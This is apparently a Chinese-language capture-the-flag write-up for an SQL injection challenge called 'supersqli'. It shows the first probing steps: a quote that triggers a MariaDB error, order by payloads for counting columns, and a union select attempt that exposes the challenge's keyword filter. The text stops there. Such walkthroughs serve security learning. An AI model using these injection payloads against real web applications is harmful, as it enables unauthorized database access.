# supersqli

难度系数: 2.0
题目描述：随便注

遇到 `SQL` 题我是有一点点恶感和害怕的, 感觉每题的注射方式都不一样!

尝试一些简单的值: `1'` 返回错误:

`error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1`

从 `MariaDB` 我们可以知道这题是 `MYSQL` 注入.

检查 `table` 有 2 `columns`:

```
?inject=1'+order+by+1--+
?inject=1'+order+by+2--+
?inject=1'+order+by+3--+ 返回错误
```

本题也 `filter` 一些字:

```
?inject=1'+union+select+1,2--+
返回: return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```

